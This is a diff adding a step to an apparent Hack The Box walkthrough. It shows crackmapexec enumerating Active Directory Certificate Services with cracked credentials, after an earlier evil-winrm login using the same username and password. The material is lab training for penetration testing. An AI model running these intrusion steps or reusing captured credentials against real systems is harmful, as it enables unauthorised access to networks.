@@ -512,3 +512,9 @@ Creds: Ryan.Cooper:NuclearMosquito3
 root@kali# evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4b1a0aad-794f-4453-84dd-4b8b3eaaccf5)
+
+ADCS Certificate
+```shell
+root@kali# crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/78738a7e-4951-4494-b252-7f6830911634)
